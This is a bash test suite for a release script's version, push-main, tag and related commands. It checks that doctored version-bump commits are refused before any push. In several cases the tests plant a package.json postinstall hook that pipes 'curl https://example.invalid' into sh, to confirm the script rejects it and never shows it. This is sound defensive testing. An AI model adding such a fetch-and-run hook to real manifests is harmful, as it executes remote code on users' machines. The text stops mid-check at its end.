#!/usr/bin/env bash
# Tests for `release-push.sh version`, the one version step every build job
# calls: the tag an earlier attempt pushed, the bump release-bump.sh computes
# since the newest tag, the npm fallback for a first release, --expect and the
# refusals; for `release-push.sh push-main`: the version-bump push through the
# deploy key, its same-package race resolution (LEGION-75) and its re-run
# cases; for `release-push.sh tagged`, which finds the tag an earlier attempt
# pushed and refuses one whose name is not <prefix>X.Y.Z; for `release-push.sh
# tag`, which commits the bump and tags it, pushing nothing; for
# `release-push.sh release`, which makes a GitHub release carry the run's
# assets; for `release-push.sh restart`, which leaves a lost version's commit
# to a later unfinished run or starts a run for it, bounded, against a stub gh;
# for `release-push.sh push-tag`, which pushes a tag with the deploy
# key; for `release-push.sh push-built`, which lands a changed build of the
# Claude Envoy plugin on main through land_on_main, on main's tip when main
# moved, starts a fresh run when a build input changed or main was rewritten,
# lands nothing when main holds a newer build, and refuses a doctored one;
# for `release-push.sh check-built`, which refuses
# what push-built refuses without a checkout or a credential; for
# `release-push.sh extract-built`, which replaces the checkout's two built
# directories with a checked build and refuses a bad one untouched; for
# `release-push.sh handed`, which checks the version and the files a build job
# hands a publish job and prints the release tag; for `release-push.sh
# no-credential`, the build job's tripwire; and for `release-push.sh
# fold-plan` and `push-fold`, the changelog fold.
#
# Each push-main case builds a bare origin holding one seed commit
# (packages/pkg at 1.0.0 plus a README) and two clones, a and b. Clone a plays
# the release run whose bump commit already landed on main; clone b plays the
# next run of the same package, whose checkout predates that bump — so b's push
# is rejected and its rebase meets a's change on the same "version" line. In
# the re-run cases, b plays a later attempt of a's run or of an older run; in
# the refusal cases, b's HEAD carries a branch commit beside the bump, a bump
# that changes a second file, a manifest-only commit that changes more than the
# version (on main's tip, or on an older main commit, before any rebase), or a
# merge commit over main's tip — or is a root commit with no parent — each of
# which push-main refuses before any push. A
# pre-receive hook that always rejects forces the exhaustion case. push-main
# reaches origin as push-tag does: through the deploy key, with the GitHub URL
# rewritten to the local origin by GIT_CONFIG_*, so the key directory is all
# the script makes, and a recording hook sees what it held during the push.
# The `tagged` cases build the commits and tags release runs leave in clone a
# and read them from several checkouts. The `version` cases build the same on
# another origin and run the version step from each checkout, with a stub `npm`
# first on PATH for the first-release fallback. The `tag` cases rewrite the
# manifest and run `tag` against an origin that must end up without the tag.
# The publish-job case runs `tag`, `push-tag` and `push-main` for two packages
# from one clone, as release.yaml's publish job does, each from the run's
# commit, then a re-run of them, and the same re-run without the detach
# between the packages.
# The `release` cases run against a stub `gh` first on PATH, which answers `gh
# release view` for a release that does not exist, is a draft or is published,
# can fail an upload, an edit or a create, and logs every call it gets. The
# `push-tag` cases push to a local bare origin through a URL rewrite, and two
# more reach github.com itself: one with the pinned host keys, one with a copy
# of the script whose pinned key GitHub does not hold. Those, and a comparison
# of the pinned keys with `gh api meta`, print a SKIP line and count nothing
# when the network or a gh sign-in is missing. The `push-built` cases seed a
# bare origin's main with the real build input list, a source file of the
# plugin, an excluded changelog and the plugin's built files under
# packages/claude-envoy/dist and legion, check out its tip detached as the
# push job does, and run push-built on a tar each case makes (`tar -cf … -C
# <tree> dist legion`) from a tree it may doctor, reaching origin through the
# deploy key and the URL rewrite and starting runs through the restart cases'
# stub gh. A changed build lands as one commit on the base, by
# github-actions[bot], with the skip keyword; an identical one pushes nothing.
# With main moved past the base by commits that touch no build input (an empty
# commit, docs, a changelog the list excludes), it lands as one commit on the
# moved tip, changing only dist/ and legion/, and starts no run; moved by a
# build input (a source file, a rename out of the plugin, a rename inside it,
# the list itself) or with no list at the base (a ::warning), it lands and
# starts one `gh workflow run claude-envoy-rebuild.yaml`, and a failed one
# exits 1 saying the build landed. Main already holding github-actions[bot]'s
# rebuild of a newer commit, or a person's commit under the rebuild subject,
# lands nothing and starts nothing; a rebuild of the base itself with the same
# bytes pushes nothing. Run from packages/claude-envoy instead of the
# checkout's root, it refuses main's newer build all the same, and lands a tar
# named relative to that subdirectory. Main rewritten past the base lands
# nothing and starts one run. A `git` wrapper first on PATH lands a merge
# between push-built's fetch and its push: nothing lands and land_on_main's one
# run is the only one.
# A push rejected while main's tip is still the base fails and starts nothing;
# and no DEPLOY_KEY is refused before any push. A doctored tar is refused with
# main moved by a docs-only commit or by a build input, before any fetch. Each
# refusal — a symlink, a hard link,
# a `..`, an absolute path, a member outside dist/ and legion/ or with another
# character, an executable member, a missing bundle, manifest or agent, a base
# that is not 40 lower-case hex, a HEAD not at the base, a dirty tree — leaves
# origin, the clone and its work tree as they were. The landing cases and those
# on a moved main also check nothing is left in TMPDIR. The `check-built` cases run
# it on the good tar and on refused ones (an executable member, a skill script
# among them, a symlink, a name with a space, a missing dist/dispatch.js) from
# an empty directory outside any repository, and check it writes nothing there,
# in TMPDIR or beside the tars. The `extract-built` case runs it from inside a
# clone of such an origin, whose two directories carry a file the build lacks,
# on a refused tar (nothing changes) and on a good one (the directories become
# exactly the tar's files). The `handed` cases fill a directory with the
# archives a release ships, change one thing as a compromised build job could,
# and run `handed` on it. The `no-credential`
# cases run it under `env -i` with a throwaway HOME, plant one credential at a
# time, and check it is named but never shown. The `fold-plan` and `push-fold`
# cases build one repository with released and unreleased packages, fragments
# added before, between and after hand-made release tags of both shapes (a
# bump-shaped tag on a child of the built commit, a listener-shaped tag on the
# built commit itself, and a name off <prefix>X.Y.Z), committed near midnight
# in zones other than UTC; push-fold runs on a copy of it per case, with notes
# the test writes (no changie), against a bare origin through the deploy key
# and the URL rewrite push-main uses, and a stub `gh` that logs each call.
#
# Run from anywhere: .github/scripts/release-push.test.sh
# CI runs it in ci.yaml's test job.
set -euo pipefail
# Hermetic: the developer's global/system git config (commit.gpgsign,
# core.hooksPath, rerere, rebase.*) must not reach the seed repos or the script
# under test. Needs git >= 2.32.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
release_push="$script_dir/release-push.sh"
work=$(mktemp -d)
trap 'rm -rf "$work"' EXIT

# shellcheck source=.github/scripts/test-lib.sh
source "$script_dir/test-lib.sh"

identity() {
  git -C "$1" config user.name "release test"
  git -C "$1" config user.email "release-test@example.com"
}

# setup <dir>: bare origin at <dir>/origin.git holding the seed commit, and
# clones <dir>/a and <dir>/b of it, both still at the seed commit.
setup() {
  local dir=$1
  mkdir -p "$dir/seed/packages/pkg"
  git init -q -b main "$dir/seed"
  identity "$dir/seed"
  printf '{\n  "name": "pkg",\n  "version": "1.0.0"\n}\n' > "$dir/seed/packages/pkg/package.json"
  printf 'seed line\n' > "$dir/seed/README.md"
  git -C "$dir/seed" add -A
  git -C "$dir/seed" commit -q -m "seed"
  git clone -q --bare "$dir/seed" "$dir/origin.git"
  git clone -q "$dir/origin.git" "$dir/a"
  git clone -q "$dir/origin.git" "$dir/b"
  identity "$dir/a"
  identity "$dir/b"
}

# set_version <clone> <version> [<package-dir>]: rewrite the manifest's .version
# with jq, as the workflow's "Set release version" step does; <package-dir>
# defaults to packages/pkg.
set_version() {
  local manifest=$1/${3:-packages/pkg}/package.json
  jq --arg v "$2" '.version = $v' "$manifest" > "$1/tmp.json" \
    && mv "$1/tmp.json" "$manifest"
}

# bump <clone> <version>: what the workflow's "Set release version" step and
# `release-push.sh tag` do together — rewrite .version and commit it (together
# with anything the case already staged).
bump() {
  local clone=$1 v=$2
  set_version "$clone" "$v"
  git -C "$clone" add packages/pkg/package.json
  git -C "$clone" commit -q -m "chore: release pkg v$v [skip ci]"
}

# change <clone> <path> <subject>: a commit with <subject> that appends a line
# to <path>, creating it as needed.
change() {
  local clone=$1 path=$2 subject=$3
  mkdir -p "$(dirname "$clone/$path")"
  printf '%s\n' "$subject" >> "$clone/$path"
  git -C "$clone" add "$path"
  git -C "$clone" commit -q -m "$subject"
}

# The deploy key push-main and push-tag push with. The script under test writes
# it under TMPDIR; each case gives it a fresh one and checks it is left empty.
ssh-keygen -q -t ed25519 -N '' -C release-push-test -f "$work/deploy"

# record_hook <origin.git>: a pre-receive hook that records what TMPDIR held
# while the push ran (mode and name of each file, sorted) in $PUSH_SEEN, and
# rejects the push when PUSH_REJECT is set.
record_hook() {
  cat > "$1/hooks/pre-receive" <<'HOOK'
#!/usr/bin/env bash
find "$TMPDIR" -type f -printf '%m %f\n' | sort > "$PUSH_SEEN"
[ -z "${PUSH_REJECT:-}" ]
HOOK
  chmod +x "$1/hooks/pre-receive"
}

# deploy_run <clone> [VAR=value...] -- <command> <arg>...: runs `release-push.sh
# <command> <arg>...` from <clone> with the deploy key, a fresh TMPDIR and the
# GitHub URL rewritten to the case's origin, <clone>/../origin.git, so git
# pushes locally, each VAR=value set after those; leaves its exit code in rc,
# its combined output in out, what a recording hook saw in seen (nothing when
# no push reached origin) and what TMPDIR holds afterwards in left.
deploy_run() {
  local clone=$1 dir vars=()
  dir=$(dirname "$clone")
  shift
  while [ "$1" != -- ]; do
    vars+=("$1")
    shift
  done
  shift
  rm -rf "$dir/tmp" && mkdir "$dir/tmp"
  : > "$dir/seen"
  set +e
  out=$(cd "$clone" && env TMPDIR="$dir/tmp" PUSH_SEEN="$dir/seen" \
    GITHUB_REPOSITORY=example/repo DEPLOY_KEY="$(<"$work/deploy")" GIT_CONFIG_COUNT=1 \
    GIT_CONFIG_KEY_0="url.$dir/origin.git.insteadOf" GIT_CONFIG_VALUE_0="git@github.com:example/repo.git" \
    "${vars[@]}" "$release_push" "$@" 2>&1)
  rc=$?
  set -e
  seen=$(<"$dir/seen")
  left=$(find "$dir/tmp" -mindepth 1 | wc -l)
}

# push_main <clone> <version> [summary-file] [VAR=value...]: deploy_run's
# `push-main packages/pkg <version>`, with the job summary in <summary-file>.
push_main() {
  local clone=$1 v=$2 summary=${3:-}
  shift 2
  [ $# -eq 0 ] || shift
  deploy_run "$clone" GITHUB_STEP_SUMMARY="$summary" "$@" -- push-main packages/pkg "$v"
}

# tagged <clone> <tag-prefix> [<package-dir>]: runs the script under test's
# `tagged` from <clone>; leaves its exit code in rc, its stdout (the tag the
# version step reads) in out and its stderr in err.
tagged() {
  local clone=$1
  shift
  set +e
  out=$(cd "$clone" && "$release_push" tagged "$@" 2>"$work/tagged.err")
  rc=$?
  set -e
  err=$(<"$work/tagged.err")
}

origin_version() { git -C "$1/origin.git" show main:packages/pkg/package.json | jq -r .version; }
origin_tip_subject() { git -C "$1/origin.git" log -1 --format=%s main; }
release_commits() { git -C "$1/origin.git" log --format=%s main | { grep -c '^chore: release' || true; }; }
not_rebasing() { [ ! -d "$1/.git/rebase-merge" ] && [ ! -d "$1/.git/rebase-apply" ] && echo true || echo false; }

echo "Case 1: two releases of one package race on the version line"
setup "$work/c1"
# a's bump also changes another key, so the resolution must keep main's copy of
# the file (HEAD at the rebase stop), not just replay b's version line.
jq '.description = "set on main by a"' "$work/c1/a/packages/pkg/package.json" > "$work/c1/a/tmp.json" \
  && mv "$work/c1/a/tmp.json" "$work/c1/a/packages/pkg/package.json"
bump "$work/c1/a" 1.0.1
git -C "$work/c1/a" push -q origin main
bump "$work/c1/b" 1.0.2
push_main "$work/c1/b" 1.0.2
check "push-main exits 0" "$(is "$rc" 0)"
check "origin/main holds the higher version" "$(is "$(origin_version "$work/c1")" 1.0.2)"
check "origin/main keeps main's other change to the manifest" "$(is "$(git -C "$work/c1/origin.git" show main:packages/pkg/package.json | jq -r .description)" "set on main by a")"
check "origin/main has one bump commit per release" "$(is "$(release_commits "$work/c1")" 2)"
check "the rebased bump commit keeps its message" "$(is "$(origin_tip_subject "$work/c1")" "chore: release pkg v1.0.2 [skip ci]")"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c1/b")"

echo
echo "Case 2: a HEAD carrying a commit besides the bump is refused before any push"
# A workflow_dispatch from a branch checks out that branch; its commits must
# not reach main through the deploy key.
setup "$work/c2"
record_hook "$work/c2/origin.git"
change "$work/c2/b" README.md "feat: on the branch"
bump "$work/c2/b" 1.0.1
push_main "$work/c2/b" 1.0.1 "$work/c2/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error counts the commits HEAD carries over main" "$(contains "$out" '^::error::HEAD carries 2 commits main does not')"
check "error lists each commit, short sha and subject" "$(contains "$out" '^::error::HEAD carries 2 commits main does not .* [0-9a-f]* chore: release pkg v1\.0\.1 \[skip ci\]; [0-9a-f]* feat: on the branch .* and push-main pushes the one version-bump commit')"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2/summary.md" 2>/dev/null)" 'HEAD carries 2 commits main does not.*feat: on the branch.*The release itself succeeded.*only this version-bump push to main is outstanding')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2")" seed)"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c2/b")"

echo
echo "Case 2b: a bump commit that changes a second file is refused before any push"
setup "$work/c2b"
record_hook "$work/c2b/origin.git"
printf 'from b\n' > "$work/c2b/b/README.md"
git -C "$work/c2b/b" add README.md
bump "$work/c2b/b" 1.0.1
push_main "$work/c2b/b" 1.0.1
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error names the paths the one commit changes" "$(contains "$out" '^::error::HEAD carries 1 commit main does not .* chore: release pkg v1\.0\.1 \[skip ci\] .* which changes README\.md packages/pkg/package\.json, and push-main pushes the one version-bump commit, which changes only packages/pkg/package\.json,')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2b")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2b")" seed)"

echo
echo "Case 2c: a manifest-only commit at the release version that carries more than the version is refused"
# A branch whose one commit over main's tip already holds the release version:
# "Set release version" changes nothing, `tag` commits nothing, and that commit
# is what push-main sees as the bump. Whatever else the file carries must not
# land, and must not be shown.
setup "$work/c2c"
record_hook "$work/c2c/origin.git"
jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2c/b/packages/pkg/package.json" > "$work/c2c/b/tmp.json" \
  && mv "$work/c2c/b/tmp.json" "$work/c2c/b/packages/pkg/package.json"
git -C "$work/c2c/b" add packages/pkg/package.json
git -C "$work/c2c/b" commit -q -m "feat: a release the author bumped"
push_main "$work/c2c/b" 1.0.1 "$work/c2c/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2c/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2c")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2c")" seed)"

echo
echo "Case 2d: a manifest-only commit at the release version that changes nothing but the version lands"
# The exact bump, authored on the branch under the author's own subject: what a
# run from main would land, so parity lets it through.
setup "$work/c2d"
record_hook "$work/c2d/origin.git"
set_version "$work/c2d/b" 1.0.1
git -C "$work/c2d/b" add packages/pkg/package.json
git -C "$work/c2d/b" commit -q -m "feat: a release the author bumped"
push_main "$work/c2d/b" 1.0.1
check "push-main exits 0" "$(is "$rc" 0)"
check "origin/main holds the version" "$(is "$(origin_version "$work/c2d")" 1.0.1)"
check "origin/main's tip is the author's commit" "$(is "$(origin_tip_subject "$work/c2d")" "feat: a release the author bumped")"
check "the push went through the deploy key" "$(is "$seen" "600 key"$'\n'"600 known_hosts")"

echo
echo "Case 2e: a merge commit over main's tip is refused, even one carrying only the bump"
# Its first parent is the seed, its second main's tip, its tree the seed's plus
# the bump: one commit main does not have, changing only the manifest against
# its first parent, whose push would fast-forward main back to the seed's tree.
setup "$work/c2e"
change "$work/c2e/a" src/guard.js "feat: guard"
git -C "$work/c2e/a" push -q origin main
record_hook "$work/c2e/origin.git"
tip=$(git -C "$work/c2e/origin.git" rev-parse main)
git -C "$work/c2e/b" fetch -q origin main
# `ours` never fast-forwards; --no-commit leaves the merge open for the bump
# (its "stopped before committing" note goes to stderr).
git -C "$work/c2e/b" merge -s ours --no-commit FETCH_HEAD >/dev/null 2>&1
set_version "$work/c2e/b" 1.0.1
git -C "$work/c2e/b" add packages/pkg/package.json
git -C "$work/c2e/b" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
check "the merge commit's parents are the seed and main's tip" \
  "$(is "$(git -C "$work/c2e/b" log -1 --format=%P HEAD)" "$(git -C "$work/c2e/origin.git" rev-parse main^) $tip")"
check "the merge commit changes only the manifest against its first parent" \
  "$(is "$(git -C "$work/c2e/b" diff --name-only HEAD^ HEAD)" packages/pkg/package.json)"
push_main "$work/c2e/b" 1.0.1 "$work/c2e/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says HEAD has two parents" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 2 parents; the version-bump commit has one\. push-main pushes the one version-bump commit')"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2e/summary.md" 2>/dev/null)" 'has 2 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2e/origin.git" rev-parse main)" "$tip")"
check "origin/main still holds the file the merge would have dropped" "$(git -C "$work/c2e/origin.git" cat-file -e main:src/guard.js && echo true || echo false)"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2e")" 1.0.0)"

echo
echo "Case 2f: a parentless HEAD is refused through the error sink"
# A repository of one root commit holding the manifest at the release version:
# it is one commit main does not have, and reading HEAD^ would die with git's
# bare fatal, outside the ::error:: and the summary.
setup "$work/c2f"
record_hook "$work/c2f/origin.git"
mkdir -p "$work/c2f/root/packages/pkg"
git init -q -b main "$work/c2f/root"
identity "$work/c2f/root"
git -C "$work/c2f/root" remote add origin "$work/c2f/origin.git"
printf '{\n  "name": "pkg",\n  "version": "1.0.1"\n}\n' > "$work/c2f/root/packages/pkg/package.json"
git -C "$work/c2f/root" add -A
git -C "$work/c2f/root" commit -q -m "chore: release pkg v1.0.1 [skip ci]"
push_main "$work/c2f/root" 1.0.1 "$work/c2f/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says HEAD has no parent" "$(contains "$out" '^::error::HEAD [0-9a-f]* has 0 parents; the version-bump commit has one\.')"
check "no bare git fatal reaches the log" "$(is "$(contains "$out" '^fatal: ')" false)"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2f/summary.md" 2>/dev/null)" 'has 0 parents.*The release itself succeeded.*only this version-bump push to main is outstanding')"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2f")" 1.0.0)"
check "origin/main's tip is still the seed" "$(is "$(origin_tip_subject "$work/c2f")" seed)"

echo
echo "Case 2g: the doctored manifest-only commit of 2c on a stale branch is refused before any rebase"
# main moved on after the checkout, so the commit's parent is an older main
# commit. The content checks run against that parent before the rebase that
# would carry the commit onto main's tip, so it is refused where it stands.
setup "$work/c2g"
change "$work/c2g/a" src/guard.js "feat: guard"
git -C "$work/c2g/a" push -q origin main
record_hook "$work/c2g/origin.git"
tip=$(git -C "$work/c2g/origin.git" rev-parse main)
seed=$(git -C "$work/c2g/b" rev-parse HEAD)
jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g/b/packages/pkg/package.json" > "$work/c2g/b/tmp.json" \
  && mv "$work/c2g/b/tmp.json" "$work/c2g/b/packages/pkg/package.json"
git -C "$work/c2g/b" add packages/pkg/package.json
git -C "$work/c2g/b" commit -q -m "feat: a release the author bumped"
check "the commit's parent is the seed, which main has moved past" "$([ "$(git -C "$work/c2g/b" rev-parse HEAD^)" = "$seed" ] && [ "$seed" != "$tip" ] && echo true || echo false)"
push_main "$work/c2g/b" 1.0.1 "$work/c2g/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error says the manifest differs from its parent's in more than the version" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\. push-main pushes the one version-bump commit")"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c2g/summary.md" 2>/dev/null)" "differs from its parent's in more than \.version = 1\.0\.1.*The release itself succeeded.*only this version-bump push to main is outstanding")"
check "the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
check "no rebase was started" "$(not_rebasing "$work/c2g/b")"
check "HEAD still sits on the seed, not rebased onto main's tip" "$(is "$(git -C "$work/c2g/b" rev-parse HEAD^)" "$seed")"
check "nothing was pushed" "$(is "$seen" "")"
check "origin/main's tip is still main's own" "$(is "$(git -C "$work/c2g/origin.git" rev-parse main)" "$tip")"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c2g")" 1.0.0)"

# The same commit when main already holds the version: the rebase path would
# drop it whole with the superseded-version notice, so the checks must refuse
# it before that exit.
setup "$work/c2g-held"
bump "$work/c2g-held/a" 1.0.1
git -C "$work/c2g-held/a" push -q origin main
record_hook "$work/c2g-held/origin.git"
tip=$(git -C "$work/c2g-held/origin.git" rev-parse main)
jq '.version = "1.0.1" | .scripts.postinstall = "curl https://example.invalid | sh"' "$work/c2g-held/b/packages/pkg/package.json" > "$work/c2g-held/b/tmp.json" \
  && mv "$work/c2g-held/b/tmp.json" "$work/c2g-held/b/packages/pkg/package.json"
git -C "$work/c2g-held/b" add packages/pkg/package.json
git -C "$work/c2g-held/b" commit -q -m "feat: a release the author bumped"
push_main "$work/c2g-held/b" 1.0.1 "$work/c2g-held/summary.md"
check "main already at the version: push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "main already at the version: error says the manifest differs from its parent's" "$(contains "$out" "^::error::HEAD's packages/pkg/package\.json differs from its parent's in more than \.version = 1\.0\.1\.")"
check "main already at the version: no superseded-version notice, the commit is refused, not dropped" "$(is "$(contains "$out" '::notice title=Version bump not pushed')" false)"
check "main already at the version: the output never shows the manifest's content" "$(is "$(contains "$out" 'example\.invalid\|postinstall')" false)"
check "main already at the version: no rebase was started" "$(not_rebasing "$work/c2g-held/b")"
check "main already at the version: nothing was pushed" "$(is "$seen" "")"
check "main already at the version: origin/main's tip is still a's bump" "$(is "$(git -C "$work/c2g-held/origin.git" rev-parse main)" "$tip")"

echo
echo "Case 3: five rejections fail, saying the release succeeded and only the push is outstanding"
setup "$work/c3"
printf '#!/bin/sh\necho "rejected by test hook" >&2\nexit 1\n' > "$work/c3/origin.git/hooks/pre-receive"
chmod +x "$work/c3/origin.git/hooks/pre-receive"
bump "$work/c3/b" 1.0.1
push_main "$work/c3/b" 1.0.1 "$work/c3/summary.md"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "push was attempted exactly five times" "$(is "$(printf '%s\n' "$out" | grep -c 'rejected by test hook')" 5)"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "error says only the version-bump push is outstanding" "$(contains "$out" 'only this version-bump push to main is outstanding')"
check "job summary says the same" "$(contains "$(cat "$work/c3/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
check "origin/main manifest is untouched" "$(is "$(origin_version "$work/c3")" 1.0.0)"

echo
echo "Case 4: a release of another package racing in still rebases cleanly"
setup "$work/c4"
mkdir -p "$work/c4/a/packages/other"
printf '{\n  "name": "other",\n  "version": "2.0.1"\n}\n' > "$work/c4/a/packages/other/package.json"
git -C "$work/c4/a" add -A
git -C "$work/c4/a" commit -q -m "chore: release other v2.0.1 [skip ci]"
git -C "$work/c4/a" push -q origin main
bump "$work/c4/b" 1.0.1
push_main "$work/c4/b" 1.0.1
check "push-main exits 0" "$(is "$rc" 0)"
check "origin/main holds the bump" "$(is "$(origin_version "$work/c4")" 1.0.1)"
check "origin/main has both release commits" "$(is "$(release_commits "$work/c4")" 2)"

echo
echo "Case 5: an unreachable origin fails through the same message"
setup "$work/c5"
bump "$work/c5/b" 1.0.1
# The GitHub URL rewritten to a path that does not exist.
push_main "$work/c5/b" 1.0.1 "$work/c5/summary.md" GIT_CONFIG_KEY_0="url.$work/c5/nowhere.git.insteadOf"
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error names the fetch" "$(contains "$out" '^::error::Fetching main from origin failed on attempt 1\.')"
check "error says the release itself succeeded" "$(contains "$out" '^::error::.*The release itself succeeded')"
check "job summary says the same" "$(contains "$(cat "$work/c5/summary.md" 2>/dev/null)" 'The release itself succeeded.*only this version-bump push to main is outstanding')"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c5/b")"

echo
echo "Case 6: the manifest deleted on main is a real divergence, not resolved"
setup "$work/c6"
git -C "$work/c6/a" rm -q -r packages/pkg
git -C "$work/c6/a" commit -q -m "a: remove pkg"
git -C "$work/c6/a" push -q origin main
bump "$work/c6/b" 1.0.1
push_main "$work/c6/b" 1.0.1
check "push-main exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "error names the manifest as the conflict" "$(contains "$out" '^::error::.*conflicts in: packages/pkg/package\.json\.')"
check "rebase was aborted" "$(not_rebasing "$work/c6/b")"
check "clone's manifest is intact, not truncated" "$(is "$(jq -r .version "$work/c6/b/packages/pkg/package.json")" 1.0.1)"
check "origin/main is untouched" "$(is "$(origin_tip_subject "$work/c6")" "a: remove pkg")"

echo
echo "Case 7: a re-run whose first attempt already landed its bump pushes nothing"
setup "$work/c7"
bump "$work/c7/a" 1.0.1
git -C "$work/c7/a" push -q origin main
# The re-run recommits the same bump at a later time, so it is a commit of its own.
GIT_AUTHOR_DATE="2001-01-01T00:00:00Z" GIT_COMMITTER_DATE="2001-01-01T00:00:00Z" bump "$work/c7/b" 1.0.1
check "the re-run's bump is a different commit from main's" "$([ "$(git -C "$work/c7/b" rev-parse HEAD)" != "$(git -C "$work/c7/origin.git" rev-parse main)" ] && echo true || echo false)"
push_main "$work/c7/b" 1.0.1 "$work/c7/summary.md"
check "push-main exits 0" "$(is "$rc" 0)"
check "notice says main already holds the version" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json already holds v1\.0\.1")"
check "origin/main holds the version" "$(is "$(origin_version "$work/c7")" 1.0.1)"
check "origin/main has one bump commit, not two" "$(is "$(release_commits "$work/c7")" 1)"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c7/b")"

echo
echo "Case 8: a re-run after a later release of the package landed never lowers main's version"
setup "$work/c8"
bump "$work/c8/a" 1.0.2
git -C "$work/c8/a" push -q origin main
bump "$work/c8/b" 1.0.1
push_main "$work/c8/b" 1.0.1 "$work/c8/summary.md"
check "push-main exits 0" "$(is "$rc" 0)"
check "notice names the later release" "$(contains "$out" "^::notice title=Version bump not pushed::main's packages/pkg/package.json holds v1\.0\.2, a later release than v1\.0\.1")"
check "job summary says the bump was not pushed" "$(contains "$(cat "$work/c8/summary.md" 2>/dev/null)" 'Version bump for packages/pkg v1.0.1 not pushed')"
check "origin/main keeps the later version" "$(is "$(origin_version "$work/c8")" 1.0.2)"
check "origin/main has only the later release's bump commit" "$(is "$(release_commits "$work/c8")" 1)"
check "clone is not left mid-rebase" "$(not_rebasing "$work/c8/b")"

echo
echo "Case 8b: push-main pushes through the deploy key and leaves none behind"
setup "$work/c8b"
record_hook "$work/c8b/origin.git"
bump "$work/c8b/b" 1.0.1
push_main "$work/c8b/b" 1.0.1
check "pushes: exits 0" "$(is "$rc" 0)"
check "pushes: origin/main holds the bump" "$(is "$(origin_version "$work/c8b")" 1.0.1)"
check "pushes: the key and the pinned host keys were owner-only while the push ran" \
  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
check "pushes: nothing is left in TMPDIR" "$(is "$left" 0)"
setup "$work/c8c"
record_hook "$work/c8c/origin.git"
bump "$work/c8c/b" 1.0.1
push_main "$work/c8c/b" 1.0.1 "" PUSH_REJECT=1
check "five rejections: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "five rejections: says the push race was lost 5 times" "$(contains "$out" '^::error::.*lost the push race to main 5 times\.')"
check "five rejections: the key and the pinned host keys were owner-only while the pushes ran" \
  "$(is "$seen" "600 key"$'\n'"600 known_hosts")"
check "five rejections: nothing is left in TMPDIR" "$(is "$left" 0)"
check "five rejections: origin/main manifest is untouched" "$(is "$(origin_version "$work/c8c")" 1.0.0)"
setup "$work/c8d"
bump "$work/c8d/b" 1.0.1
push_main "$work/c8d/b" 1.0.1 "$work/c8d/summary.md" DEPLOY_KEY=
check "no DEPLOY_KEY: exits non-zero" "$([ "$rc" != 0 ] && echo true || echo false)"
check "no DEPLOY_KEY: the error names it and says the release itself succeeded" \
  "$(is "$(contains "$out" '^::error::.*DEPLOY_KEY')|$(contains "$out" 'The release itself succeeded')" 'true|true')"
check "no DEPLOY_KEY: the job summary says the same" \
